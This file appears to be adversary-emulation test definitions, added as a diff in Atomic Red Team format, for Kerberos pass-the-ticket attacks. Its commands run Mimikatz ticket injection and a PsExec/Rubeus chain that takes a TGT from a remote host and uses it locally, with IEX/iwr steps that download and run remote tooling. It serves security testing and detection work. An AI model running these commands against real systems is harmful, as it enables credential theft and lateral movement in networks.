@@ -1,0 +1,91 @@
+{
+  "attack_technique": "T1550.003",
+  "display_name": "Use Alternate Authentication Material: Pass the Ticket",
+  "atomic_tests": [
+    {
+      "name": "Mimikatz Kerberos Ticket Attack",
+      "description": "Similar to PTH, but attacking Kerberos",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\""
+      },
+      "input_arguments": {
+        "ticket": {
+          "description": "Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module)",
+          "type": "string",
+          "default": null
+        },
+        "mimikatz_exe": {
+          "description": "Path of the Mimikatz binary",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})",
+          "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath"
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "dbf38128-7ba7-4776-bedf-cc2eed432098"
+    },
+    {
+      "name": "Rubeus Kerberos Pass The Ticket",
+      "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\#{target} -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge"
+      },
+      "input_arguments": {
+        "target": {
+          "description": "Remote system to request the TGT from",
+          "type": "string",
+          "default": "localhost"
+        },
+        "user_name": {
+          "description": "username associated with the ticket (privileged account not required)",
+          "type": "string",
+          "default": "Administrator"
+        },
+        "password": {
+          "description": "password for user_name",
+          "type": "string",
+          "default": "Password"
+        },
+        "domain": {
+          "description": "domain",
+          "type": "string",
+          "default": "$Env:USERDOMAIN"
+        },
+        "rubeus_url": {
+          "description": "URL of Rubeus executable",
+          "type": "url",
+          "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Rubeus must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"",
+          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\""
+        },
+        {
+          "description": "PsExec must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"",
+          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}",
+          "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force"
+        }
+      ],
+      "auto_generated_guid": "a2fc4ec5-12c6-4fb4-b661-961f23f359cb"
+    }
+  ]
+}
